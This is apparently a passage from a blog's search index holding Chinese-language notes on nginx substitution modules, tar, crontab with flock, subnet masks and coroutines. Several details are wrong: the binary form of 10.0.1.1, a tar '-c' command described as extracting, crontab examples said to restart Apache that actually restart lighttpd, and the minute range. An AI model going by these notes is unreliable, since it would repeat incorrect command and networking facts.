plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 这里会将网页里的`dog`替换成`pig`</span><br><span class="line">sub_filter dog pig;</span><br><span class="line"></span><br><span class="line"># 在头部引入一段js。注意，我们只能使用一次sub_filter，如果有多个地方或者更复杂的替换使用下面的`NGX_HTTP_SUBSTITUTIONS_FILTER_MODULE`模块</span><br><span class="line">sub_filter &lt;/head&gt; &#x27;&lt;/head&gt;&lt;script language=&quot;javascript&quot; src=&quot;https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js&quot;&gt;&lt;/script&gt;&#x27;;</span><br></pre></td></tr></table></figure></li><li>sub_filter_types  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 指定需要被替换的MIME类型,默认为&#x27;text/html&#x27;，如果制定为*，那么所有的</span><br><span class="line">sub_filter_types text/javascript text/css;</span><br></pre></td></tr></table></figure></li><li>sub_filter_once  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">字符串替换一次还是多次替换，默认替换一个。如果网页中有多个`dog`字符串，如果开启once只会替换第一个。</span><br><span class="line">sub_filter_once on;</span><br></pre></td></tr></table></figure></li></ul><h3 id="NGX-HTTP-SUBSTITUTIONS-FILTER-MODULE"><a href="#NGX-HTTP-SUBSTITUTIONS-FILTER-MODULE" class="headerlink" title="NGX_HTTP_SUBSTITUTIONS_FILTER_MODULE"></a>NGX_HTTP_SUBSTITUTIONS_FILTER_MODULE</h3><p><a href="https://github.com/yaoweibin/ngx_http_substitutions_filter_module">NGX_HTTP_SUBSTITUTIONS_FILTER_MODULE</a>和NGX_HTTP_SUB_MODULE类似，不过功能更强大，在这里我们可以使用正则去匹配。</p><p>这是一个第三方模块，编译时需要加上<code>--add-module=/path/to/ngx_http_substitutions_filter_module</code>。</p><p>它主用两个指令</p><ul><li><p>subs_filter</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 替换`&lt;script src=&quot;jquery.min.js?v=3.2.1&quot;&gt;&lt;/script&gt;`的版本为URL上v参数值。</span><br><span class="line"># 例如：我们请求`index.html?v=2.2.2`，处理后我们拿到的网页内容就是`&lt;script src=&quot;jquery.min.js?v=2.2.2&quot;&gt;&lt;/script&gt;`。</span><br><span class="line"># $arg_v取出query上的v的值。$arg代表query，$arg_&#123;x&#125;代表query上&#123;x&#125;的值。</span><br><span class="line">subs_filter jquery\.min\.js\?v=\d\.\d\.\d jquery.min.js?v=$arg_v or;</span><br><span class="line"># subs_filter 可以写多个</span><br><span class="line">subs_filter dog pig;</span><br></pre></td></tr></table></figure><p>  subs_filter 第三个参数，替换模式。我们可以选择字符串替换或者正则替换</p><ul><li>g(default):替换所有匹配的字符串。</li><li>i: 执行不区分大小写的匹配。</li><li>o: 只需将第一个。</li><li>r:该模式是作为一个正则表达式处理，默认是固定的字符串。</li></ul></li><li><p>subs_filter_types</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 指定需要被替换的MIME类型,默认为&#x27;text/html&#x27;，如果制定为*，那么所有的</span><br><span class="line">sub_filter_types text/javascript text/css;</span><br></pre></td></tr></table></figure></li></ul><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="http://rmingwang.com/install-nginx-third-modules-http_sub_module.html">Nginx编译安装第三方模块http_substitutions_filter_module</a></p><h3 id="NGINX-HTTP-CONCAT"><a href="#NGINX-HTTP-CONCAT" class="headerlink" title="NGINX-HTTP-CONCAT"></a><a href="https://github.com/alibaba/nginx-http-concat">NGINX-HTTP-CONCAT</a></h3><p>用于 css、js 合并。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/static/??foo.css,bar/foobaz.js</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;??foo1.css,foo2.css,subdir/foo3.css?v=2345&quot; /&gt;</span><br><span class="line">&lt;script src=&quot;??bar1.js,bar22.css,subdir/bar3.js?v=3245&quot; /&gt;</span><br></pre></td></tr></table></figure><h3 id="HTTP-IMAGE-FILTER-MODULE"><a href="#HTTP-IMAGE-FILTER-MODULE" class="headerlink" title="HTTP_IMAGE_FILTER_MODULE"></a>HTTP_IMAGE_FILTER_MODULE</h3><h3 id="NGINX-HTTP-FOOTER-FILTER"><a href="#NGINX-HTTP-FOOTER-FILTER" class="headerlink" title="NGINX-HTTP-FOOTER-FILTER"></a>NGINX-HTTP-FOOTER-FILTER</h3><p><a href="http://www.ttlsa.com/nginx/nginx-modules-nginx-http-footer-filter/">http://www.ttlsa.com/nginx/nginx-modules-nginx-http-footer-filter/</a></p><h3 id="LIMIT-UPLOAD-RATE"><a href="#LIMIT-UPLOAD-RATE" class="headerlink" title="LIMIT_UPLOAD_RATE"></a>LIMIT_UPLOAD_RATE</h3><p>限制客户端上传速率</p><h3 id="NGINX-HTTP-GEO-IP-MODULE"><a href="#NGINX-HTTP-GEO-IP-MODULE" class="headerlink" title="NGINX-HTTP-GEO-IP-MODULE"></a>NGINX-HTTP-GEO-IP-MODULE</h3><h3 id="NGX-DYNAMIC-UPSTREAM"><a href="#NGX-DYNAMIC-UPSTREAM" class="headerlink" title="NGX_DYNAMIC_UPSTREAM"></a>NGX_DYNAMIC_UPSTREAM</h3><p>Dynamic upstream for nginx</p><h3 id="HTTP-UPSTREAM-CONSISTENT-HASH-MODULE"><a href="#HTTP-UPSTREAM-CONSISTENT-HASH-MODULE" class="headerlink" title="HTTP_UPSTREAM_CONSISTENT_HASH_MODULE"></a>HTTP_UPSTREAM_CONSISTENT_HASH_MODULE</h3>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tar.md</title>
      <link href="/post/tar.html"/>
      <url>/post/tar.html</url>
      
        <content type="html"><![CDATA[<h3 id="tar命令"><a href="#tar命令" class="headerlink" title="tar命令"></a>tar命令</h3><p>tar命令用来压缩和解压文件，它本身不具有压缩功能，它是调用压缩功能实现的。</p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>主选项</p><ul><li>-c 建立压缩档案</li><li>-x 解压</li><li>-t 查看内容</li><li>-r 追加文件</li><li>-u 更新压缩包文件</li></ul><p>辅助项</p><ul><li>-z 有gzip属性的</li><li>-j 有bz2属性的</li><li>-Z 有compress属性的</li><li>-v 显示所有过程</li><li>-O 将文件解开到标准输出</li><li>-C 切换到指定目录</li><li>-f 指定压缩文件<blockquote><p>参数-f是必须的<br>-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。</p></blockquote></li></ul><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p>查看<br><code>tar -tf note.tar.gz</code>   在不解压的情况下查看压缩包的内容  </p><p>压缩<br><code>tar -cvf note.tar *.md</code> -c是表示产生新的包，-f指定包的文件名<br><code>tar -czf note.tar.gz *.md</code> 使用gzip压缩<br><code>tar -cjf note.tar.bz2 *.md</code> 使用bzip2压缩<br><code>tar -cZf note.tar.Z *.md</code> 使用compress压缩</p><p>解压<br><code>tar –xvf file.tar</code> 解压tar包<br><code>tar -xzvf file.tar.gz</code> 解压tar.gz<br><code>tar -xjvf file.tar.bz2</code>  解压tar.bz2<br><code>tar –xZvf file.tar.Z</code> 解压tar.Z</p><p>其他命令<br><code>tar -rf note.tar tar_new.md</code> 表示追加note.md到包中<br><code>tar -uf note.tar tar.md</code> 表示更新tar.md文件<br><code>tar -cf note.tar -C ./output/</code> 解压文件到output目录中</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.cnblogs.com/peida/archive/2012/11/30/2795656.html">【1】</a> <a href="http://www.cnblogs.com/jyaray/archive/2011/04/30/2033362.html">【2】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>crontab</title>
      <link href="/post/crontab.html"/>
      <url>/post/crontab.html</url>
      
        <content type="html"><![CDATA[<h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><h3 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*　　*　　*　　*　　*　　command</span><br><span class="line">分　 时　 日　 月　 周　 命令</span><br></pre></td></tr></table></figure><ol><li>第1列表示分钟1～59 每分钟用*或者 *&#x2F;1表示</li><li>第2列表示小时1～23（0表示0点）</li><li>第3列表示日期1～31</li><li>第4列表示月份1～12</li><li>第5列标识号星期0～6（0表示星期天）</li></ol><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>crontab文件的一些例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 21 * * * /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>上面的例子表示每晚的21:30重启apache。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">45 4 1,10,22 * * /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>上面的例子表示每月1、10、22日的4 : 45重启apache。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 1 * * 6,0 /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>上面的例子表示每周六、周日的1 : 10重启apache。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0,30 18-23 * * * /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>上面的例子表示在每天18 : 00至23 : 00之间每隔30分钟重启apache。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 23 * * 6 /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>上面的例子表示每星期六的11 : 00 pm重启apache。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* */1 * * * /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>每一小时重启apache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* 23-7/1 * * * /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>晚上11点到早上7点之间，每隔一小时重启apache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 11 4 * mon-wed /usr/local/etc/rc.d/lighttpd restart</span><br></pre></td></tr></table></figure><p>每月的4号与每周一到周三的11点重启apache</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 6 * * *</span><br></pre></td></tr></table></figure><p>每天早上6点10分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 */2 * * *</span><br></pre></td></tr></table></figure><p>每两个小时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 23-7/2,8 * * *</span><br></pre></td></tr></table></figure><p>晚上11点到早上8点之间每两个小时，早上8点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 11 4 * mon-wed</span><br></pre></td></tr></table></figure><p>每个月的4号和每个礼拜的礼拜一到礼拜三的早上11点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 4 1 jan * </span><br></pre></td></tr></table></figure><p>1月份日早上4点</p><blockquote><p>*&#x2F;n 代表每n&#x2F;单位执行一下</p></blockquote><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol><li>crontab -e 编辑任务</li><li>crontab -l 列出所有的任务</li><li>crontab -r 删除所有的任务</li></ol><h3 id="服务管理"><a href="#服务管理" class="headerlink" title="服务管理"></a>服务管理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service crond [start|stop|restart|status]</span><br></pre></td></tr></table></figure><h3 id="查看crontab输出日志"><a href="#查看crontab输出日志" class="headerlink" title="查看crontab输出日志"></a>查看crontab输出日志</h3><ul><li><p>Linux<br>位于&#x2F;var&#x2F;log&#x2F;cron-* 文件中</p></li><li><p>Mac</p></li></ul><h3 id="flock"><a href="#flock" class="headerlink" title="flock"></a>flock</h3><p>如果任务执行时间过长而间隔太短就会出现上个任务还没结束下个任务就又开始执行了，长期下去会给系统负载造成很大影响。针对这种情况，可以利用<code>flock</code>的锁机制保证只有一个任务在执行。</p><p>flock命令参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-s, --shared:    获得一个共享锁  </span><br><span class="line">-x, --exclusive: 获得一个独占锁  </span><br><span class="line">-u, --unlock:    移除一个锁，通常是不需要的，脚本执行完会自动丢弃锁  </span><br><span class="line">-n, --nonblock:  如果没有立即获得锁，直接失败而不是等待  </span><br><span class="line">-w, --timeout:   如果没有立即获得锁，等待指定时间  </span><br><span class="line">-o, --close:     在运行命令前关闭文件的描述符号。用于如果命令产生子进程时会不受锁的管控  </span><br><span class="line">-c, --command:   在shell中运行一个单独的命令  </span><br><span class="line">-h, --help       显示帮助  </span><br><span class="line">-V, --version:   显示版本</span><br></pre></td></tr></table></figure><p>例子：</p><ol><li><p>防止<code>rsync</code>重复执行</p><p> 先创建一个lock文件：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch /var/run/rsync.lock</span><br></pre></td></tr></table></figure><p> 配置crontab：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 * * * * flock -xn /var/run/rsync.lock -c &#x27;rsync -avz src dest &gt;/dev/null 2&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.jb51.net/LINUXjishu/19905.html">Linux crontab定时执行任务</a></li><li><a href="https://blog.csdn.net/qivan/article/details/53836426">linux之crontab定时执行命令走过的坑坑</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> crontab </tag>
            
            <tag> flock </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子网掩码</title>
      <link href="/post/ip-mask.html"/>
      <url>/post/ip-mask.html</url>
      
        <content type="html"><![CDATA[<h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><h3 id="ip-mask写法"><a href="#ip-mask写法" class="headerlink" title="ip&#x2F;mask写法"></a>ip&#x2F;mask写法</h3><p>在配置防火墙时有时间需要对某个IP段进行匹配，防火墙IP段用IP&#x2F;MASK方式表示。</p><p>MASK的取值可以是1到32，因为IP地址的二进制刚好是32位。</p><p><code>10.0.1.1/24</code>表示一个是子网掩码为24的<code>10.0.1.1</code>的IP地址。<code>10.0.1.1</code>的二进制是<code>00001010.00001010.00001010.00000001</code>。<code>10.0.1.1/24</code> 说明了子网掩码遮住了24位，也说明了这个IP的<code>网络号net_id</code>是24位，网段占了24位。</p><p><strong>简单点说<code>10.0.1.1/24</code>等同于<code>10.0.1.*</code></strong></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://zhihu.com/question/29723388/answer/50704994">子网掩码与ip地址有实际关系吗？</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>进程线程协程</title>
      <link href="/post/process-thread-coroutine.html"/>
      <url>/post/process-thread-coroutine.html</url>
      
        <content type="html"><![CDATA[<h3 id="进程-线程-协程"><a href="#进程-线程-协程" class="headerlink" title="进程-&gt;线程-&gt;协程"></a>进程-&gt;线程-&gt;协程</h3><p>在现实世界中，基本是是按着这样的顺序演化：process–&gt;thread–&gt;coroutine&#x2F;fiber 其实是一个 context 切换开销从大到小的演化，process 切换开销最大，需要切换地址空间，所有的 CPU 状态，所有其他资源 thread 切换只需要切换 CPU 状态，当然是大部分的 CPU 状态，而 coroutine 切换，只需要切换很少的 CPU 状态，而且全部都在用户地址空间运行，不需要到内核空间。</p><ul><li>thread之間需要context-switch，而且成本很高，但是coroutine之間的切換很快</li><li>coroutine的成本很低，可以很輕易的產生大量的coroutine</li><li>這些事情全是在同一個thread裡發生的，<del>因此不會有race condition等問題發生</del> (還是可能會有)</li><li>thread的context-switch雖然我們可以進行某種程度的控制，但是很多部份還是得靠OS來決定要先排程哪個thread，而coroutine的執行是由我們自己控制的</li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://blog.csdn.net/whinah/article/details/3501276">process–&gt;thread–&gt;coroutine</a></li><li><a href="http://blog.ez2learn.com/2010/07/17/talk-about-coroutine-and-gevent/">淺談coroutine與gevent</a></li><li><a href="https://www.zhihu.com/question/20511233/answer/24260355">协程的好处有哪些？</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> process </tag>
            
            <tag> thread </tag>
            
            <tag> coroutine </tag>
            
            <tag> fiber </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>README</title>
      <link href="/post/README.html"/>
      <url>/post/README.html</url>
      
        <content type="html"><![CDATA[<ul><li><input checked="" disabled="" type="checkbox"> <a href="brew.md">brew.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="JavaScript==%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.md">JavaScript&#x3D;&#x3D;中的类型转换.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="JavaScript%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2.md">JavaScript类型转换.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="Linux%E6%97%B6%E5%8C%BA.md">Linux时区.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="SSH.md">SSH.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="apt.md">apt.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="cdn.md">cdn.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="elasticsearch.md">elasticsearch.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-elasticsearch.md">install-elasticsearch.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-kibana.md">install-kibana.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-logstash.md">install-logstash.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E6%97%B6%E9%97%B4%E5%90%8C%E6%AD%A5.md">时间同步.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="kibana.md">kibana.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="logstash.md">logstash.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="node%E6%A8%A1%E5%9D%97%E6%9F%A5%E6%89%BE%E7%AD%96%E7%95%A5.md">node模块查找策略.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="npm.md">npm.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="vscode-keymap.md">vscode-keymap.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="yum-zip.md">yum-zip.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E6%A0%91%E8%8E%93%E6%B4%BE%E8%93%9D%E7%89%99.md">树莓派蓝牙.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C.md">虚拟机网络.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E6%A0%91%E8%8E%93%E6%B4%BE%E8%AE%BE%E7%BD%AEWIFI.md">树莓派设置WIFI.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E6%A0%91%E8%8E%93%E6%B4%BE%E6%91%84%E5%83%8F%E5%A4%B4%E6%8C%82%E8%BD%BD.md">树莓派摄像头挂载.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F.md">树莓派安装操作系统.md</a></li><li><input disabled="" type="checkbox"> <a href="git-submodules.md">git子模块</a></li><li><input checked="" disabled="" type="checkbox"> <a href="iptables.md">iptables.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="atom-keymap.md">atom-keymap.md</a></li><li><input disabled="" type="checkbox"> <a href="process-thread-coroutine.md">进程线程协程</a></li><li><input checked="" disabled="" type="checkbox"> <a href="crontab.md">crontab.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="ip-mask.md">ip-mask.md</a></li><li><input disabled="" type="checkbox"> <a href="python%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81.md">python字符编码.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E5%AE%89%E8%A3%85nginx.md">安装nginx.md</a></li><li><input disabled="" type="checkbox"> <a href="nginx%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97.md">nginx常用模块.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="tar.md">tar.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="yum.md">yum.md</a></li><li><input disabled="" type="checkbox"> <a href="express-view.md">express-view.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="cookie.md">cookie.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="https.md">https.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="supervisor.md">supervisor.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="undefined.md">undefined.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="typeof&instanceof.md">typeof&amp;instanceof.md</a></li><li><input disabled="" type="checkbox"> <a href="%E9%97%AD%E5%8C%85.md">闭包.md</a></li><li><input disabled="" type="checkbox"> <a href="etag.md">etag.md</a></li><li><input disabled="" type="checkbox"> <a href="redis.md">redis</a></li><li><input checked="" disabled="" type="checkbox"> <a href="java-redis-session.md">java-redis-session.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8.md">nginx开机启动.md</a></li><li><input disabled="" type="checkbox"> <a href="linux-chkconfig.md">linux-chkconfig.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-openresty.md">install-openresty.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-grep.md">linux-grep.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="http-cache.md">HTTP缓存.md</a></li><li><input disabled="" type="checkbox"> <a href="%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E7%9A%84%E6%97%B6%E9%97%B4%E8%A1%A8%E7%A4%BA.md">计算机中的时间表示.md</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-kernel.md">Linux内核</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F.md">环境变量</a></li><li><input checked="" disabled="" type="checkbox"> <a href="Linux%E9%87%8D%E5%AE%9A%E5%90%91.md">Linux重定向</a></li><li><input checked="" disabled="" type="checkbox"> <a href="Mac%E4%B8%8D%E8%83%BD%E6%B8%85%E7%A9%BA%E5%BA%9F%E7%BA%B8%E7%AF%93.md">Mac不能清空废纸篓</a></li><li><input checked="" disabled="" type="checkbox"> <a href="mongoose-validation.md">mongoose-validation</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-docker.md">install-docker</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-%E7%AB%AF%E5%8F%A3.md">linux-端口</a></li><li><input checked="" disabled="" type="checkbox"> <a href="fish-shell.md">fish-shell</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.md">linux-常用命令</a></li><li><input checked="" disabled="" type="checkbox"> <a href="Docker%E7%9A%84%E9%95%9C%E5%83%8F%E5%AD%98%E6%94%BE%E7%9B%AE%E5%BD%95%E4%BF%AE%E6%94%B9%E4%B8%8E%E8%BF%81%E7%A7%BB.md">Docker的镜像存放目录修改与迁移</a></li><li><input checked="" disabled="" type="checkbox"> <a href="%E9%98%BF%E9%87%8C%E4%BA%91docker%E9%95%9C%E5%83%8F%E5%8A%A0%E9%80%9F.md">阿里云docker镜像加速</a></li><li><input disabled="" type="checkbox"> <a href="OpenResty%E6%80%BB%E7%BB%93.md">OpenResty总结</a></li><li><input disabled="" type="checkbox"> <a href="Node.js%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5.md">Node.js性能问题排查</a></li><li><input checked="" disabled="" type="checkbox"> <a href="Install-Docker-Compose.md">Install-Docker-Compose</a></li><li><input disabled="" type="checkbox"> <a href="zip.md">zip</a></li><li><input checked="" disabled="" type="checkbox"> <a href="http://t.cn/RfGBh0H">Linux信号机制</a></li><li><input checked="" disabled="" type="checkbox"> <a href="http://t.cn/Rftexm0">VSCode智能提示</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx-location.md">nginx-location</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx-virtual-host.md">Nginx虚拟主机</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nginx-http-limit.md">Nginx限流</a></li><li><input checked="" disabled="" type="checkbox"> <a href="telnet.md">telnet</a>  </li><li><input checked="" disabled="" type="checkbox"> <a href="ab.md">ab</a>  </li><li><input checked="" disabled="" type="checkbox"> <a href="pip.md">pip</a></li><li><input checked="" disabled="" type="checkbox"> <a href="python-virtualenv.md">python-virtualenv</a></li><li><input checked="" disabled="" type="checkbox"> <a href="tensorflow.md">tensorflow</a></li><li><input checked="" disabled="" type="checkbox"> <a href="protobuf.md">protobuf</a></li><li><input disabled="" type="checkbox"> <a href="notebook.md">notebook</a></li><li><input checked="" disabled="" type="checkbox"> <a href="iotop.md">iotop</a></li><li><input checked="" disabled="" type="checkbox"> <a href="install-python.md">install-python</a></li><li><input disabled="" type="checkbox"> <a href="gnu-paralell.md">gnu-paralell</a></li><li><input disabled="" type="checkbox"> <a href="pigz.md">pigz</a></li><li><input checked="" disabled="" type="checkbox"> <a href="VirtualBox-CentOS7.md">VirtualBox-CentOS7</a></li><li><input checked="" disabled="" type="checkbox"> <a href="rsync.md">rsync</a></li><li><input checked="" disabled="" type="checkbox"> <a href="synchronousVSasynchronous&blockingVSnon-blocking.md">同步&#x2F;异步&amp;阻塞&#x2F;非阻塞</a></li><li><input checked="" disabled="" type="checkbox"> <a href="web-messaging.md">web通信</a></li><li><input checked="" disabled="" type="checkbox"> <a href="eslint.md">ESLint</a></li><li><input checked="" disabled="" type="checkbox"> <a href="node_modules.md">node_modules</a></li><li><input checked="" disabled="" type="checkbox"> <a href="page-auto-refresh.md">页面自动刷新</a></li><li><input disabled="" type="checkbox"> <a href="curl.md">curl</a></li><li><input checked="" disabled="" type="checkbox"> <a href="mysql.md">mysql</a></li><li><input disabled="" type="checkbox"> <a href="socket-error.md">socket常见错误</a></li><li><input checked="" disabled="" type="checkbox"> <a href="linux-system-directory.md">linux系统目录</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nodejs-best-practice.md">Node.js最佳实践</a></li><li><input checked="" disabled="" type="checkbox"> <a href="rabbitmq.md">RabbitMQ</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nohup.md">nohup</a></li><li><input checked="" disabled="" type="checkbox"> <a href="GUID.md">GUID</a></li><li><input disabled="" type="checkbox"> <a href="jvm.md">Java虚拟机</a></li><li><input checked="" disabled="" type="checkbox"> <a href="speedtest.md">网速测试</a></li><li><input checked="" disabled="" type="checkbox"> <a href="httpstat.md">httpstat</a></li><li><input checked="" disabled="" type="checkbox"> <a href="nodejs-dns-cache.md">nodejs-dns-cache</a></li><li><input checked="" disabled="" type="checkbox"> <a href="modify-dns.md">修改DNS</a></li><li><input checked="" disabled="" type="checkbox"> <a href="mysql-explain.md">Mysql Explain 解释</a></li><li><input disabled="" type="checkbox"> <a href="understand-docker.md">理解Docker</a></li><li><input checked="" disabled="" type="checkbox"> <a href="npm-config.md">NPM配置</a></li><li><input checked="" disabled="" type="checkbox"> <a href="soft-link&hard-link.md">软连接与硬链接</a></li><li><input checked="" disabled="" type="checkbox"> <a href="localtunnel.md">localtunnel</a></li><li><input checked="" disabled="" type="checkbox"> <a href="spring-framework.md">Spring 